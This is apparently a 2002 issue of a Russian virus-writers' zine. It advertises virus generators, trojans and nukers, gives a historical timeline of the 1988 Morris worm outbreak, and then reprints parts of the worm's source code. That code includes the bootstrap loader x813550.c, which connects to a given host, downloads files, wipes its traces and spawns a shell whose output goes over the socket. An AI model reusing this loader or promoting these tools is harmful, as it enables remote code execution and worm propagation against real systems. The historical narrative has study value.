
                      -=POWER HEAP RESEARCH=-
          =>независимая оpганизация наyчных исследований<=

 ▀▀▀▀▀▀ ▀▀▀   ▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀
   ▀▀   ▀▀▀▀  ▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
   ▀▀   ▀▀ ▀▀ ▀▀ ▀▀▀▀▀   ▀▀▀▀▀   ▀▀▀         ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀
   ▀▀   ▀▀  ▀▀▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
 ▀▀▀▀▀▀ ▀▀   ▀▀▀ ▀▀      ▀▀▀▀▀▀▀   ▀▀▀▀▀     ▀▀    ▀▀▀▀▀▀▀ ▀▀▀▀▀▀

           ▀▀▀▀▀▀▀       ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀    ▀▀▀▀▀
           ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀   ▀▀  ▀▀
           ▀▀▀▀▀   ▀▀▀▀▀ ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀  ▀▀▀  ▀▀▀▀
           ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀  ▀▀   ▀▀   ▀▀
           ▀▀▀▀▀▀▀       ▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀   ▀▀   ▀▀▀▀▀
                       Helloween.virus@mail.ru
                    http://www.helloween.boom.ru
                      http://www.rezus.boom.ru
                        [ЖУРHАЛ  ВИРМЕЙКЕРОВ]

                    ┌───────────────────────────┐
                    │Hомеp 5 за 2002  (номеp 10)│
                    └───────────────────────────┘


 Хай, это опять мы. В тюpьмy мы пока не собиpаемся. Hас и на воле не-
плохо коpмят. Мы тyт даже забадяжили паpочкy сайтов (смотpи выше).
Там Вы можете найти последнюю веpсию HVG и дpyгие генеpатоpы виpyсов,
виpyсы, нюкеpы, тpояны и бомбы. И конечно же, наши жypналы. А тепеpь
Пpодолжим свое дело.

                         ЧЕРВЬ РОБЕРТА МОРРИСА
                            (пpодолжение)

     Но можно попытаться представить примерную картину распространения
вируса  на  основании  сообщений, проходивших в компьютерных сетях, не
подвергшихся нападению,  и  многочисленных  публикаций  в  прессе.   В
частности,  представляют интерес сообщения, проходившие во время атаки
по  электронным  почтам  VIRUS_L  (далее  VIR)  и  RISKS_FORUM  (далее
RISKS) [B2].
     Специалисты  старшего  поколения   утверждают,   что   сообщения,
проходившие   в  сетях  во  время  вирусной  атаки,  очень  напоминают
сообщения о вражеских боевых действиях, поступавших по связи во  время
Второй  мировой  войны.   Во  всяком  случае,  эти сообщения позволяют
ощутить полную беспомощность,  царившую  во  время  вирусной  атаки  в
различных  узлах  сети,  примерно  оценить  возможность  пользователей
понять, что же происходит и сделать выводы относительно  требований  к
системе оказания помощи в подобных ситуациях.

     Итак, 2 ноября 1988 года, среда.

  17:00  Вирус обнаружен в Корнеллском университете (Нью-Йорк).

  21:00  Вирус обнаружен в системах Стэнфордского университета и фирмы

______________________________
     [A8] 5.11.1988, статья Джона Маркоффа "Author of Computer 'Virus'
is son of USA Electronic Security Expert".

______________________________
     [B1] Что, кстати, сильно затруднило потом работу следствия.

     [B2] Полное название - "Forum on Risks to the Public in Computers
and  Related  States:   ACM Committee and Public Policy".  Организован
Петером Ньюманом.
     Обзоры этих сообщений, используемых, в частности, и  в  настоящей
статье,    были    опубликованы    в    нескольких   номерах   журнала
"Computer &Security" в начале 1989 года.

     Rand Corporation (Калифорния).

  22:00  Вирусом поражена система университета в Беркли (Калифорния).

  23:00  Вирус   обнаружен    специалистами    отделения    математики
     Принстонского университета (Нью-Джерси).

     Сначала  все  обнаружившие  вирус  подумали,  что  это  очередной
инцидент, касающийся только их системы.  Никто естественно представить
себе не мог, какие масштабы примет  эпидемия  через  несколько  часов.
Тем  не  менее  администраторы  атакованных систем послали сообщения о
происшедшем.

  23:28   В  электронной  почте  VIRUS_L  прошло  первое  сообщение  о
     вирусе.    Сообщается,  что  атакованы  университеты  в  Дэвис  и
     Сан-Диего,   Ливерморская   лаборатория    имени    Лоуренса    и
     исследовательский  центр  НАСА [B3]  (все  в  Калифорнии).   Вход
     вируса идентифицируется как SMTP.  Атакуются все системы  4.3 BSD
     и  Sun 3.x.   Отмечается,  что  вирус распространяется по каналам
     TELNETD, FTPD, FINGER, RSHD и SMTP [B4].

  23:45  Вирус    обнаружен    в     исследовательской     лаборатории
     баллистики. [B5]

     Постепенно стало проясняться, что одни и те же признаки поражения
вирусом  наблюдают  пользователи,  находящиеся в разных концах страны.
Учитывая  совпадение  событий  по  времени,  был  сделан  вывод,   что
национальные  компьютерные  системы  атакованы одним и тем же вирусом,
распространяющимся через сети, поскольку иным способом распространения
нельзя  было объяснить скорость, с которой вирус появлялся в различных
концах США, если, конечно, не предположить,  что  все  происходящее  -
результат  заранее  спланированной и хорошо подготовленной акции некой
преступной группы,  имеющей  доступ  ко  всем  национальным  системам.
Жизнь  администраторов  американских  систем  после установления этого
факта, как говорится, переставала быть безинтересной!
     Для пользователей и системных администраторов  атакованных  узлов
сетей  поведение  вируса  было  непостижимым.   В некоторых системах в
директории /usr/tmp появлялись необычные файлы;  в  журнальных  файлах
ряда  утилит  появлялись странные сообщения.  Наиболее примечательным,
однако, было то, что все более и  более  повышалась  загрузка  систем,
приводившая  в  конце  концов  либо  к  исчерпанию  свободного  места,
выделенного  под  свопинг,  либо  к  переполнению  системной   таблицы
процессов - в любом случае это означало блокировку системы.

     Исходя из названия сетей, в которых вирус был обнаружен, его  тут
же  окрестили вирусом Milnet/Arpanet.  Вскоре, однако, выяснилось, что
вирус из Arpanet благополучно перекочевал в сеть Science Internet -  и
он  тут  же  получает  название  "вирус Internet".  Но после того, как
Корнеллский университет высказал  косвенно  доказанное  предположение,
что  вирус,  вероятно, разработан в его стенах, вирус получает наконец
одно  из  наиболее  распространившихся,  благодаря  стараниям  прессы,
название  -  вирус  Cornell/Arpanet.   Это название вируса появилось в
двух передовых статьях и  последующей  серии  заметок  Джона  Маркофа,
Лоренца М.  Фишера, Мишеля Вайнеса, Джеффа Герса и Калвина Симса [B6],
опубликованных в "Нью-Йорк Таймс" с 4 по 17 ноября 1988 года.

     Вообще  для  специалистов  оказалось   приятным   сюрпризом   то,
насколько  подробно  и грамотно пресса комментировала события.  Филипп
Гарднер - полковник в отставке, специалист по безопасности компьютеров
-  написал  по этому поводу:  "Казалось, репортеры точно знали, у кого
можно получить достоверную  информацию,  и,  кроме  того,  они  делали
хорошие  выводы из того, что эти лица говорили.  Это тем более приятно
в условиях, когда мы становимся, к несчастью, свидетелями ненормальной
тенденции к росту числа 'экспертов' в среде самих журналистов."

     Наступило 3 ноября, четверг.

  01:00  Сообщения о заражении 15-ти узлов сети Arpanet.

  02:00  Поражена   вирусом    система    Гарвардского    университета
     (Массачусетс).

  03:30  Вирус обнаружен  в  Центре  Массачусетского  технологического
     института (Massachusets Institute of Technologies; MIT).

  03:46  В сообщении, прошедшем в электронной почте RISKS, уточняется,
     что  атакуются  системы  UNIX  -  4.3 BSD - и аналогичные ей Sun,
     работающие на компьютерах VAX фирмы DEC и компьютерах  Sun  фирмы
     Sun    Microsystems    Inc.     Сообщается   также,   что   вирус
     распространяется  через  дыры  в  системе  безопасности   утилиты
     электронной почты Sendmail, имеющейся в составе указанных систем.

  04:00  Поскольку   сеть    перегружена,    распространение    вируса
     замедляется; к этому моменту заражены уже более 1000 узлов сети.

  05:15  В университете Карнеги-Меллона в Питтсбурге (Пенсильвания) из
     100 компьютеров, подключенных к Arpanet, вышло из строя 80.

  08:00  Сообщение о вирусе из астрофизического центра Smithonian.

     Впоследствии возникло несколько  версий  относительно  того,  как
именно и кем был обнаружен вирус.

     Согласно первой, вирус был  обнаружен  в  ночь  со  2 на 3 ноября
1988 года   одним  из  научных  сотрудников  Ливерморской  лаборатории
им.Лоуренса.  Обращаясь со своего домашнего терминала к вычислительной

______________________________
     [B3] Соответственно, Lawrence Livermore Laboratory и NASA's Aimes
Research Center.

     [B4] SMTP расшифровывается как простой протокол передачи почты  -
Simple  Mail  Transfer  Protocol; FTP - как протокол передачи файлов -
File Transfer Protocol; а TELNET является названием протокола эмуляции
терминала.   Эти  протоколы являются подпротоколами TCP/IP, созданными
для реализации соответствующих функций.

     [B5] Army Ballistic Research Laboratory.

     [B6] John Markoff, Lawrence M. Fisher, Michael Wines, Jeff Gerth,
Calvin Sims.


системе  лаборатории,  он заметил необычное повышение интенсивности ее
загрузки.  Заподозрив неладное, сотрудник сообщил  об  этом  дежурному
оператору   и  тот  (очевидно  руководствуясь  инструкцией)  сразу  же
отключил систему от сети Science Internet, по которой  распространялся
вирус.
     Специалисты Ливерморской лаборатории действительно  могли  одними
из  первых  обнаружить  вирус.   Дело  в  том,  что  эта  лаборатория,
проводившая исследования по программе СОИ  и  разработку  новых  видов
ядерного  оружия,  в  мае  1988 года уже сталкивалась с вирусом, после
чего,  по   всей   видимости,   были   приняты   дополнительные   меры
предосторожности и повышена бдительность.
     Немедленно об инциденте было сообщено  Управлению  связи  МО  США
(Defence Communication Agency; DCA), в ведении которого находится сеть
Arpanet.  В три часа ночи о вирусной  атаке  узнало  руководство  DoD.
Однако, несмотря на оперативность извещения, локализовать вирус в сети
было уже невозможно.

     По второй версии извещение о  появлении  вируса  было  отправлено
неизвестным  лицом  по  компьютерной  сети вместе с инструкцией по его
уничтожению.  Но сеть была перегружена и очень  многие  вычислительные
центры  не  сразу  приняли  сигнал.   Когда  же, наконец, на сообщение
обратили внимание, было уже поздно.

     Согласно  третьей   версии   первыми   обнаружили   неполадки   в
вычислительной  системе  специалисты  MIT.  Внимание ответственного за
безопасность  вычислительноо  центра  привлекло  необычное   поведение
компьютера.  Машина интенсивно функционировала, хотя в данное время на
ней никто не работал, на дисплей никакие данные не выводились.   Через
несколько  минут  вся  память  системы была забита, и система вышла из
строя.

     Неполадки в работе систем зарегистрировали не только люди,  но  и
процессоры  вычислительных  систем.   Они  начали  передавать  в  сеть
сообщения о том, что не в состоянии принимать новые данные  вследствие
переполнения     памяти.     Благодаря    этому    центры    некоторых
научно-исследовательских  институтов  вовремя  отключились  и   сумели
избежать заражения.
     Так, одно из учебных заведений шт.Нью-Джерси - Stevens  Institute
of  Technology, получившее предупреждение, успело изолировать свою ЭВМ
и блокировать доступ вирусу.

     Вскоре выяснилось насколько серьезный удар был нанесен.
     Во-первых,  вирус  распространялся  через  компьютерную  сеть   с
чудовищной  быстротой  -  следствие  быстродействия  узловых  систем и
хорошего состояния линий связи в США.
     Во-вторых, в результате работы вируса блокировалась как сеть, так
и   атакованные  системы,  останавливавшиеся  вследствие  переполнения
памяти и/или  превышения  допустимого  предела  загрузки.   Весь  ужас
заключался  в том, что пока до администраторов систем доходило, что их
системы  подверглись  нападению,  они  начисто  лишались   возможности
что-либо предпринять, поскольку теряли доступ к перегруженной системе.

     В-третьих, инфицировалась операционная система UNIX Berkeley  4.3
-  одна  из  самых  популярных  версий  UNIX,  в  силу  наличия  в ней
электронной почты и удобных отладочных средств.  Это  было  тем  более
непонятно,  если  учесть, что UNIX - система многопользовательская и к
тому же имеет систему  защиты,  основанную  на  идентификации  каждого
пользователя с помощью паролей.  С этим сталкивались впервые.

     Атака шла  по  наиболее  популярным  среди  пользователей  страны
сетям,  включая  сеть Пентагона, и расчитывалась на поражение одной из
самых популярных операционных систем - каково!.

     Неудивительно,  что   среди   администраторов   систем   началась
настоящая паника.  Многие из них не сумели или не приложили - иногда в
течение нескольких дней - должных усилий к  тому,  чтобы  связаться  с
другими  пострадавшими,  а  попросту  лишили пользователей возможности
работать с их машинами.  В результате за несколько минут они  лишились
не  только  своих машин, к которым запретили доступ, но и других машин
Internet, с которыми они не могли работать до конца восстановления.
     Стало понятно, что если вирус не остановить, то последствия могут
быть   самые  нежелательные.   По  всей  стране  пользователи  затаили
дыхание, боясь подумать, что произойдет, если  вирус  запрограммирован
на уничтожение или повреждение данных (а это было весьма вероятно).

     Через 5 часов вирус инфицировал от 435 до 800 систем, а  всего  в
течение   полутора-двух   суток   (2-3   ноября)  поразил  около  6000
компьютеров.  Среди пострадавших - помимо уже упомянутых  -  оказались
системы   Агентства   национальной   безопасности   и  Стратегического
авиационного командования  США;  лабораторий  NASA  (в  частности  Jet
Propulsion  Laboratory;  а  в  вычислительном  центре  NASA в Хьюстоне
компьютерный вирус чуть было не затронул систему управления  запусками
кораблей  многоразового  использования  Shuttle, но ее удалось вовремя
отключить)     и     Лос-Аламосской     национальной      лаборатории;
исследовательских  центров  ВМС  США (Naval Research Laboratory, Naval
Ocean Systems Command) и Калифорнийского  технологического  института;
крупнейших  университетов  страны (в Висконсинском университете из 300
систем было "выбито" 200)  и  бесприбыльного  "мозгового  центра"  SRI
International; а также ряда военных баз, клиник и частных компаний.
     Анализ,   проведенный   специалистами,   показал,    что    схема
распространения  компьютерного  вируса  была примерно следующей:  сеть
Arpanet - Milnet - Science Internet -  NSF net.   В  результате  вирус
практически  вывел эти сети из строя.  Минимум на два дня прекратились
все научно-исследовательские работы.
     При этом, учтите, не было известно, "ушел" ли вирус через  Лондон
в Западную Европу [B8]


                        /пpодолжение следyет/

 А тепеpь файл net.c :

/* dover */

#include "worm.h"
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

/* This is the second of five source files linked together to form the '.o'
 * file distributed with the worm.
 */

if_init()                       /* 0x254c, check again */
{
    struct ifconf if_conf;
    struct ifreq if_buffer[12];
    int  s, i, num_ifs, j;
    char local[48];

    nifs = 0;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        return 0;                               /* if_init+1042 */
    if_conf.ifc_req = if_buffer;
    if_conf.ifc_len = sizeof(if_buffer);

    if (ioctl(s, SIOCGIFCONF, &if_conf) < 0) {
        close(s);
        return 0;                               /* if_init+1042 */
    }

    num_ifs = if_conf.ifc_len/sizeof(if_buffer[0]);
    for(i = 0; i < num_ifs; i++) {              /* if_init+144 */
        for (j = 0; j < nifs; j++)
            /* Oops, look again.  This line needs verified. */
            if (strcmp(ifs[j], if_buffer[i].ifr_name) == 0)
                break;
    }

}

/* Yes all of these are in the include file, but why bother?  Everyone knows
   netmasks, and they will never change... */
def_netmask(net_addr)                           /* 0x2962 */
     int net_addr;
{
    if ((net_addr & 0x80000000) == 0)
        return 0xFF000000;
    if ((net_addr & 0xC0000000) == 0xC0000000)
        return 0xFFFF0000;
    return 0xFFFFFF00;
}

netmaskfor(addr)                                /* 0x29aa */
     int addr;
{
    int i, mask;

    mask = def_netmask(addr);
    for (i = 0; i < nifs; i++)
        if ((addr & mask) == (ifs[i].if_l16 & mask))
            return ifs[i].if_l24;
    return mask;
}

rt_init()                                       /* 0x2a26 */
{
    FILE *pipe;
    char input_buf[64];
    int  l204, l304;

    ngateways = 0;
    pipe = popen(XS("/usr/ucb/netstat -r -n"), XS("r"));
                                                 /* &env102,&env 125 */
    if (pipe == 0)
        return 0;
    while (fgets(input_buf, sizeof(input_buf), pipe)) { /* to 518 */
        other_sleep(0);
        if (ngateways >= 500)
            break;
        sscanf(input_buf, XS("%s%s"), l204, l304);      /* <env+127>"%s%s" */
        /* other stuff, I'll come back to this later */


    }                                           /* 518, back to 76 */
    pclose(pipe);
    rt_init_plus_544();
    return 1;
}                                               /* 540 */

static rt_init_plus_544()                               /* 0x2c44 */
{
}

getaddrs()                                      /* 0x2e1a */
{
}

struct bar *a2in(a)             /* 0x2f4a, needs to be fixed */
     int a;
{
    static struct bar local;
    local.baz = a;
    return &local;
}

/* End of source file in original. */

/*
 * Local variables:
 * compile-command: "cc -S net.c"
 * comment-column: 48
 * End:
 */

 А еще и x813550.c :

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

main(argc, argv)
char *argv[];
{
        struct sockaddr_in sin;
        int s, i, magic, nfiles, j, len, n;
        FILE *fp;
        char files[20][128];
        char buf[2048], *p;

        unlink(argv[0]);
        if(argc != 4)
                exit(1);
        for(i = 0; i < 32; i++)
                close(i);
        i = fork();
        if(i < 0)
                exit(1);
        if(i > 0)
                exit(0);

        bzero(&sin, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(argv[1]);
        sin.sin_port = htons(atoi(argv[2]));
        magic = htonl(atoi(argv[3]));

        for(i = 0; i < argc; i++)
                for(j = 0; argv[i][j]; j++)
                        argv[i][j] = '\0';

        s = socket(AF_INET, SOCK_STREAM, 0);
        if(connect(s, &sin, sizeof(sin)) < 0){
                perror("l1 connect");
                exit(1);
        }
        dup2(s, 1);
        dup2(s, 2);

        write(s, &magic, 4);

        nfiles = 0;
        while(1){
                if(xread(s, &len, 4) != 4)
                        goto bad;
                len = ntohl(len);
                if(len == -1)
                        break;

                if(xread(s, &(files[nfiles][0]), 128) != 128)
                        goto bad;

                unlink(files[nfiles]);
                fp = fopen(files[nfiles], "w");
                if(fp == 0)
                        goto bad;
                nfiles++;

                while(len > 0){
                        n = sizeof(buf);
                        if(n > len)
                                n = len;
                        n = read(s, buf, n);
                        if(n <= 0)
                                goto bad;
                        if(fwrite(buf, 1, n, fp) != n)
                                goto bad;
                        len -= n;
                }
                fclose(fp);
        }

        execl("/bin/sh", "sh", 0);
bad:
        for(i = 0; i < nfiles; i++)
                unlink(files[i]);
        exit(1);
}

static
xread(fd, buf, n)
char *buf;
{
        int cc, n1;

        n1 = 0;
        while(n1 < n){
                cc = read(fd, buf, n - n1);
                if(cc <= 0)
                        return(cc);
                buf += cc;
                n1 += cc;
        }
        return(n1);
}
int zz;

      Бyдет еще несколько файлов...